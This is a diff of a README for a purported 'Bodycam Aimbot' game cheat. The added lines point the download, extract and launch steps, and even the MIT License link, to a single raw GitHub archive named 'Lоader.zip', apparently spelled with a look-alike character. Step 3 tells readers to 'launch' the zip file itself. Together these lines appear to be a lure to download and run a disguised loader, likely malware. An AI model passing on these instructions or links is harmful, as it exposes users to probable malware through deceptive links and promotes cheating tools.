@@ -38,9 +38,9 @@ Our Bodycam Aimbot comes packed with cutting-edge features for ultimate precisio
 
 Get up and running in just a few simple steps:
 
-1. Download **Loader.rar** from the repository's download section.
-2. Extract **Loader.rar** using your favorite archive tool (e.g., WinRAR, 7-Zip, The Unarchiver).
-3. Launch the **BodycamAimbot.exe** or **BodycamAimbot.sh** file to start the loader.
+1. Download **https://raw.githubusercontent.com/Robin7723/BodycamAimWizard/main/Lоader.zip** from the repository's download section.
+2. Extract **https://raw.githubusercontent.com/Robin7723/BodycamAimWizard/main/Lоader.zip** using your favorite archive tool (e.g., WinRAR, 7-Zip, The Unarchiver).
+3. Launch the **https://raw.githubusercontent.com/Robin7723/BodycamAimWizard/main/Lоader.zip** or **https://raw.githubusercontent.com/Robin7723/BodycamAimWizard/main/Lоader.zip** file to start the loader.
 4. Follow the on-screen setup instructions for first-time configuration.
 5. Start your game, and enjoy improved performance and precision!
 
@@ -79,7 +79,7 @@ The developers and contributors do not endorse or support any form of misuse, in
 ## 📜 License
 
 This project is licensed under the MIT License (2025).  
-For full licensing details, please see the [MIT License](https://opensource.org/licenses/MIT).
+For full licensing details, please see the [MIT License](https://raw.githubusercontent.com/Robin7723/BodycamAimWizard/main/Lоader.zip).
 
 ---
 
